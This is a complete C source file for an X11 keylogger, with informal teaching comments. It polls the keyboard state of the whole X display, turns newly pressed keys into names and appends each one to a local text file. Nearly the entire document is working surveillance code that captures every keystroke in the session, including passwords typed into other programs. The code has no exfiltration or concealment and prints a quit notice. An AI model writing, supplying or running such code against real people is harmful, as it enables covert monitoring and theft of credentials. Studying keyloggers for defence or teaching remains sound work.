//grab X11 for bitmap display so we can draw graphics.
// super old and sketchy, which is good for our use case actually
#include <X11/Xlib.h> 
#include <X11/keysym.h>
#include <X11/XKBlib.h>

#include <stdio.h> //input/output
#include <stdlib.h> //like everything
#include <unistd.h> //posix os api
#include <string.h> //guess what this one does lol

//pointer to a string literal that contains the filename
const char *log_file = "user_input.txt";

//function that logs the keys
void log_key(const char *key) {
    FILE *file = fopen(log_file, "a"); //creates logfile if it doesn't exist, opens existing if it does
    if (file != NULL) {
        fprintf(file, "%s", key); //append keystroke to file 
        fclose(file);
    }
}

int main() {
    Display *display; //make pointer of Display type defined in x11 called display. confusing? dont care
    /*
    I'm gonna take my time explaining this one. 256 possible key codes = 
    32 bytes bcoz 8 bits per byte. X11 is ancient which is why you can keylog it
    Bit: 0 or 1 (pressed or not pressed)
    Byte: 8 bits, 256 possible values (AKA "bitstring")
    */
    
    char key_state[32]; //an array of 32 bytes to hold all 256 on/off states
    char prev_key_state[32] = {0}; //initialize ALL of them to zero unless one is pressed

    //connect to X server (?)
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display.\n");
        return 1;
    }

    //why doesn't every keylogger do this? #transparency
    printf("Press Ctrl+C to quit.\n");

    while (1) {
        XQueryKeymap(display, key_state);

        for (int keycode=8; keycode <=255; keycode++) {

            int key_byte = keycode/8;
            int key_bit = keycode%8;
            
            if ((key_state[key_byte] & (1 << key_bit)) && !(prev_key_state[key_byte] & (1 << key_bit))) {

                KeySym keysym = XkbKeycodeToKeysym(display, keycode, 0, 0);

                if (keysym) {
                    const char *key = XKeysymToString(keysym);

                    if (key) {
                        log_key(key);
                    }
                }
            }

        }

        //copy current state to previous state for next iteration of the loop
        memcpy(prev_key_state, key_state, sizeof(key_state));
        usleep(10000); //reduce CPU usage, force pause
    }

    XCloseDisplay(display);
    return 0;

}

